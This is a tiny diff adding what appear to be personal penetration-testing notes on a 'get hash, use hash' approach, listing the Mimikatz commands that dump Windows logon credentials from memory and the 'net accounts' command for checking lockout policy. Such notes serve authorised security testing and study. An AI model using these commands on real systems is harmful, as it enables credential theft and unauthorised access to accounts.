@@ -1,0 +1,7 @@
+#usually its some form of "get hash, use hash"
+
+mimikatz #to get hash
+	privilege::debug
+	sekurlsa::logonpasswords
+
+net accounts # to display lockout information
